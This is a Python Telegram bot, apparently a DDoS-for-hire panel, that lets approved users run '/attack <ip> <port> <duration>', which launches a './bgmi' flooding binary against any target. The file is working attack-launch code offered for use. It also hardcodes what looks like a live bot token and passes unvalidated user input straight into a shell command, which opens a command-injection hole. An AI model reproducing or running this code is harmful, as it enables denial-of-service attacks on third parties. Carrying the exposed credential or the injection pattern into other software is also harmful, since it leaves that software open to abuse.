import asyncio
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive

keep_alive()

TELEGRAM_BOT_TOKEN = '7660887190:AAGSRnUfM0EkabRy22tMeKxAKQu9LzPTHN0'
ADMIN_USER_ID = 7352008650
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return set(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        return set()
    except Exception:
        return set()

def save_users(users):
    try:
        with open(USERS_FILE, 'w') as f:
            for user in users:
                f.write(f"{user}\n")
    except Exception:
        pass

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*♻️ WELCOME TO THE BATTLEFIELD! 🔥*\n\n"
        "*✅ USE /help TO SEE ALL COMMANDS*\n"
        "*🔗 JOIN:- @ROXZ_GAMING*\n"
        "*♻️ Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Show all available commands"""
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    
    # Basic commands for all users
    help_text = (
        "*📚 AVAILABLE COMMANDS 📚*\n\n"
        "*🔹 BASIC COMMANDS:*\n"
        "`/start` - Welcome message and bot info\n"
        "`/help` - Show all available commands\n"
        "`/attack <ip> <port> <duration>` - Launch an attack\n\n"
    )
    
    # Admin only commands
    if chat_id == ADMIN_USER_ID:
        help_text += (
            "*🔹 ADMIN COMMANDS:*\n"
            "`/manage add <user_id>` - Add user to whitelist\n"
            "`/manage rem <user_id>` - Remove user from whitelist\n"
            "`/chmod` - Give execute permissions to all files\n\n"
        )
    
    help_text += (
        "*📌 EXAMPLES:*\n"
        "`/attack 192.168.1.1 80 60`\n"
        "`/manage add 7352008650`\n"
        "`/manage rem 7352008650`\n\n"
        "*🔗 JOIN:- @ROXZ_GAMING*"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=help_text, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ YOU NEED ADMIN APPROVAL TO USE THIS COMMAND.\n\n🔗JOIN:- @ROXZ_GAMING 🚀*", 
            parse_mode='Markdown'
        )
        return

    if len(args) != 2:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ Usage: /manage <add|rem> <user_id>*", 
            parse_mode='Markdown'
        )
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if not target_user_id.isdigit():
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ Invalid user ID! Use numeric ID only.*", 
            parse_mode='Markdown'
        )
        return

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*✔️ USER {target_user_id} added successfully ✅*", 
            parse_mode='Markdown'
        )
    elif command == 'rem':
        if target_user_id in users:
            users.discard(target_user_id)
            save_users(users)
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*✔️ USER {target_user_id} removed successfully ♻️*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*⚠️ USER {target_user_id} not found in whitelist*", 
                parse_mode='Markdown'
            )
    else:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ Invalid command! Use 'add' or 'rem'*", 
            parse_mode='Markdown'
        )

async def chmod_command(update: Update, context: CallbackContext):
    """Command to give execute permissions to all files in current directory"""
    chat_id = update.effective_chat.id
    
    # Only admin can use this command for security
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ ONLY ADMIN CAN USE THIS COMMAND!*", 
            parse_mode='Markdown'
        )
        return
    
    try:
        # Get current working directory
        cwd = os.getcwd()
        
        # Execute chmod +x *
        process = await asyncio.create_subprocess_shell(
            "chmod +x *",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd
        )
        stdout, stderr = await process.communicate()
        
        if process.returncode == 0:
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*✅ SUCCESS! Execute permissions added to all files in:*\n`{cwd}`\n\n*🔗@ROXZ_GAMING*", 
                parse_mode='Markdown'
            )
        else:
            error_msg = stderr.decode() if stderr else "Unknown error"
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*❌ ERROR: Failed to execute chmod*\n`{error_msg}`", 
                parse_mode='Markdown'
            )
            
    except FileNotFoundError:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ ERROR: chmod command not found on this system*", 
            parse_mode='Markdown'
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*⚠️ ERROR: {str(e)}*", 
            parse_mode='Markdown'
        )

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        # Validate duration is number
        try:
            duration_int = int(duration)
            if duration_int <= 0:
                raise ValueError
        except ValueError:
            await context.bot.send_message(
                chat_id=chat_id, 
                text="*⚠️ Invalid duration! Please enter a positive number.*", 
                parse_mode='Markdown'
            )
            attack_in_progress = False
            return

        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except FileNotFoundError:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ ERROR: bgmi binary not found! Use /chmod to fix permissions.*", 
            parse_mode='Markdown'
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*⚠️ ERROR DURING ATTACK: {str(e)}*", 
            parse_mode='Markdown'
        )

    finally:
        attack_in_progress = False
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*♻️ ATTACK COMPLETED! 🚀*\n*THANK YOU FOR SUPPORTING US ✅!*", 
            parse_mode='Markdown'
        )

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    # Check if user is authorized
    if user_id not in users and chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ YOU NEED TO BE APPROVED TO USE THIS BOT ♻️.\n\nOWNER:- @ROXZ_GAMING 🚀*", 
            parse_mode='Markdown'
        )
        return

    # Check if another attack is in progress
    if attack_in_progress:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ ANOTHER ATTACK IS ALREADY IN PROGRESS ⛔. ♻️ PLEASE WAIT ♻️.*", 
            parse_mode='Markdown'
        )
        return

    # Check arguments
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ Usage: /attack <ip> <port> <duration>*\n\n*Example:* `/attack 192.168.1.1 80 60`", 
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    
    # Validate port is number
    try:
        port_int = int(port)
        if port_int < 1 or port_int > 65535:
            raise ValueError
    except ValueError:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ Invalid port! Please enter a number between 1-65535.*", 
            parse_mode='Markdown'
        )
        return
    
    # Send attack confirmation
    await context.bot.send_message(
        chat_id=chat_id, 
        text=(
            f"*⚔️ ATTACK LAUNCHED! ⚔️*\n"
            f"*🎯 TARGET: {ip}:{port}*\n"
            f"*🕒 DURATION: {duration} seconds*\n"
            f"*🔥 ATTACK IN PROGRESS... ♻️*\n\n"
            f"*🔗@ROXZ_GAMING*"
        ), 
        parse_mode='Markdown'
    )

    # Run attack in background
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    try:
        application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("manage", manage))
        application.add_handler(CommandHandler("attack", attack))
        application.add_handler(CommandHandler("chmod", chmod_command))
        
        print("✅ Bot is running successfully!")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"❌ Error starting bot: {e}")

if __name__ == '__main__':
    main()